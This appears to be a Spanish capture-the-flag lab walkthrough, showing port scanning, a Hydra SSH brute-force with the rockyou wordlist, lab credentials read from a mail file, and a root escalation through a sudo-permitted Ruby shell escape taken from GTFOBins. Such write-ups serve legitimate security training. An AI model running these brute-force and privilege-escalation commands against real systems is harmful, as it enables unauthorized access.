## Reconocimiento:

Puerto 22 : SSH

Puerto 80 : HTTP

En la web no veremos nada, inspeccionando el codigo hay un mensaje:

```bash
<!-- De : Juan Para Camilo , te he dejado un correo importante... -->
```

Tenemos 2 posibles usuarios y probamos un ataque de Fuerza Bruta.

```bash
Hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://IP
```

User = Camilo

Pass = password1

```bash
ssh camilo@172.17.0.2
```

## Escalada camilo → juan

Buscando en el sistema encontramos un archivo:

```bash
cd /var/mail/camilo
cat correo.txt
```

Nos da la pass de juan : 2k84dicb

## Escalada juan → root

```bash
sudo -l
(ALL) NOPASSWD: /usr/bin/ruby
```

Buscando en GTFObins encontramos el exploit:

```bash
sudo -u root ruby -e 'exec "/bin/sh"'
```

Y listo
